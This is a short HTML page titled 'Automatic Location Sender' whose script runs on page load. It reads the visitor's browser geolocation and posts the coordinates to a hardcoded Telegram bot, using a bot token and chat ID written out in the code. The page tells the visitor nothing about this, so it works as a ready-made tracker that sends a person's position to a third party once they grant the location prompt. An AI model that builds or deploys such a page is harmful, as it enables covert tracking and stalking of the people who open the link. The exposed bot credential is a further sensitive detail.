<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <title>Automatic Location Sender to Telegram</title>
    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const { latitude, longitude } = position.coords;
                    sendLocationToTelegram(latitude, longitude);
                }, error => {
                    console.error('Error getting location:', error);
                });
            } else {
                console.log('Geolocation is not supported by this browser.');
            }
        };

        function sendLocationToTelegram(latitude, longitude) {
            const url = 'https://api.telegram.org/bot6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw/sendLocation';
            const params = new URLSearchParams();
            params.append('chat_id', '1209515299');
            params.append('latitude', latitude);
            params.append('longitude', longitude);

            fetch(url, {
                method: 'POST',
                body: params
            })
            .then(response => response.json())
            .then(data => console.log('Location sent to Telegram:', data))
            .catch(error => console.error('Error sending location to Telegram:', error));
        }
    </script>
</head>
<body>
    <h1>Automatic Location Sender</h1>
</body>
</html>
